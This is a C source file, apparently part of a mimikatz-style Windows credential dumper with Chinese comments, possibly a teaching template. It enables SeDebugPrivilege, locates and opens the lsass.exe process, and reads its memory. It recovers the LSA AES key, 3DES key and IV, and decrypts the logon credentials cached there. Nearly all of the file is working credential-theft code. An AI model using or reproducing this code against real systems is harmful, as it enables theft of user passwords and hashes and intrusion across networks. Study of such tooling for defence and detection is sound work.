#include "sekurlsa.h"
#include "mimikatz.h"
#include <stdio.h>

#pragma comment (lib, "bcrypt.lib")

/*****************************************************
 *         module level global variables             *
 *****************************************************/

BYTE g_sekurlsa_IV[AES_128_KEY_LENGTH];
BYTE g_sekurlsa_AESKey[AES_128_KEY_LENGTH];
BYTE g_sekurlsa_3DESKey[DES_3DES_KEY_LENGTH];
HANDLE g_hLsass = 0;


/*****************************************************
 *         以下的函数均无需额外修改可直接调用           *
 *****************************************************/


 /// Checks the corresponding Windows privilege and returns True or False.
BOOL CheckWindowsPrivilege(IN PWCHAR Privilege) {
	LUID luid;
	PRIVILEGE_SET privs = { 0 };
	HANDLE hProcess;
	HANDLE hToken;
	hProcess = GetCurrentProcess();
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return FALSE;
	if (!LookupPrivilegeValueW(NULL, Privilege, &luid)) return FALSE;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bResult;
	PrivilegeCheck(hToken, &privs, &bResult);
	return bResult;
}

/// 启用Administrator的SeDebugPrivilege权限
VOID AdjustProcessPrivilege() {
	BOOL success = EnableSeDebugPrivilege();
	if (!success || !CheckWindowsPrivilege((WCHAR*)SE_DEBUG_NAME)) {
		printf("AdjustProcessPrivilege() not working ...\n");
		printf("Are you running as Admin ? ...\n");
		ExitProcess(-1);
	}
	else {
		printf("\n[+] AdjustProcessPrivilege() ok .\n\n");
	}
}

/// 查找并返回 lsass.exe 进程的PID
DWORD GetLsassPid() {

	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				CloseHandle(hSnapshot);
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

/// 获取 PID 为 pid 的进程句柄
HANDLE GrabLsassHandle(IN DWORD pid) {
	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	return procHandle;
}

VOID SetGlobalLsassHandle() {
	g_hLsass = GrabLsassHandle(GetLsassPid());
}

VOID PrepareUnprotectLsassMemoryKeys() {
	SetGlobalLsassHandle();
	LocateUnprotectLsassMemoryKeys();

	puts("");
	printf("[+] Aes Key recovered as:\n");
	HexdumpBytes(g_sekurlsa_AESKey, AES_128_KEY_LENGTH);

	printf("[+] InitializationVector recovered as:\n");
	HexdumpBytes(g_sekurlsa_IV, AES_128_KEY_LENGTH);

	printf("[+] 3Des Key recovered as:\n");
	HexdumpBytes(g_sekurlsa_3DESKey, DES_3DES_KEY_LENGTH);

	printf("[+] Not all zeros ... \n");
	printf("[+] All keys seems OK ... \n\n");
}

/// 在由 mem 指针指向的内存区域 [mem,mem+0x200000] 中搜索字节序列 signature 首次出现的偏移，并返回
DWORD SearchPattern(IN PUCHAR mem, IN PUCHAR signature, IN DWORD signatureLen) {
	for (DWORD offset = 0; offset < 0x200000; offset++)
		if (mem[offset] == signature[0] && mem[offset + 1] == signature[1])
			if (memcmp(mem + offset, signature, signatureLen) == 0)
				return offset;
	return 0;
}

/// 从 lsass.exe 进程的内存中的地址 addr 上读取 memOutLen 个字节存入指针 memOut 中
SIZE_T ReadFromLsass(IN LPCVOID addr, OUT LPVOID memOut, IN SIZE_T memOutLen) {
	SIZE_T bytesRead = 0;
	memset(memOut, 0, memOutLen);
	ReadProcessMemory(g_hLsass, addr, memOut, memOutLen, &bytesRead);
	return bytesRead;
}

/// 使用 g_sekurlsa_IV g_sekurlsa_AESKey 或是 g_sekurlsa_3DESKey 对缓存在lsass.exe内存中的凭据进行解密
ULONG DecryptCredentials(PCHAR encrypedPass, DWORD encryptedPassLen, PUCHAR decryptedPass, ULONG decryptedPassLen) {
	BCRYPT_ALG_HANDLE hProvider, hDesProvider;
	BCRYPT_KEY_HANDLE hAes, hDes;
	ULONG result;
	NTSTATUS status;
	unsigned char initializationVector[16];

	// Same IV used for each cred, so we need to work on a local copy as this is updated
	// each time by BCryptDecrypt
	memcpy(initializationVector, g_sekurlsa_IV, sizeof(g_sekurlsa_IV));

	if (encryptedPassLen % 8) {
		// If suited to AES, lsasrv uses AES in CFB mode
		status = BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptGenerateSymmetricKey(hProvider, &hAes, NULL, 0, g_sekurlsa_AESKey, sizeof(g_sekurlsa_AESKey), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptDecrypt(hAes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, sizeof(g_sekurlsa_IV), decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
	else {
		// If suited to 3DES, lsasrv uses 3DES in CBC mode
		status = BCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, g_sekurlsa_3DESKey, sizeof(g_sekurlsa_3DESKey), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptDecrypt(hDes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, 8, decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
}

/// 传入参数pUnicodeString指针为Lsass进程中的地址，将该地址上的UNICODE_STRING结构体解引用至当前进程
PUNICODE_STRING ExtractUnicodeString(PUNICODE_STRING pUnicodeString) {
	PUNICODE_STRING pResult;
	PWSTR mem;

	// Read LSA_UNICODE_STRING from lsass memory
	pResult = (PUNICODE_STRING)LocalAlloc(LPTR, sizeof(UNICODE_STRING));
	if (pResult == NULL) return NULL;
	ReadFromLsass(pUnicodeString, pResult, sizeof(UNICODE_STRING));

	// Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
	mem = (PWSTR)LocalAlloc(LPTR, pResult->MaximumLength);
	if (mem == NULL) return NULL;
	ReadFromLsass(pResult->Buffer, mem, pResult->MaximumLength);
	pResult->Buffer = mem;
	return pResult;
}

VOID HexdumpBytes(IN PBYTE pbPrintData, IN DWORD cbDataLen) {
	for (DWORD dwCount = 0; dwCount < cbDataLen; dwCount++) {
		printf("%02x ", pbPrintData[dwCount]);
		if ((dwCount + 1) % 16 == 0) {
			printf("| ");
			for (DWORD i = dwCount - 15; i <= dwCount; i++) {
				if (pbPrintData[i] >= 32 && pbPrintData[i] <= 126) {
					printf("%c", pbPrintData[i]);
				}
				else {
					printf(".");
				}
			}
			printf("\n");
		}
	}

	if (cbDataLen % 16 != 0) {
		DWORD padding = 16 - (cbDataLen % 16);
		for (DWORD i = 0; i < padding; i++) {
			printf("   ");
		}
		printf("| ");
		for (DWORD i = cbDataLen - (cbDataLen % 16); i < cbDataLen; i++) {
			if (pbPrintData[i] >= 32 && pbPrintData[i] <= 126) {
				printf("%c", pbPrintData[i]);
			}
			else {
				printf(".");
			}
		}
		printf("\n");
	}

	puts("");
}

VOID HexdumpBytesPacked(IN PBYTE pbPrintData, IN DWORD cbDataLen) {
	for (DWORD dwCount = 0; dwCount < cbDataLen; dwCount++) {
		printf("%02x", pbPrintData[dwCount]);
	}
}


/*****************************************************
 *         以上的函数均无需修改可直接调用               *
 *****************************************************/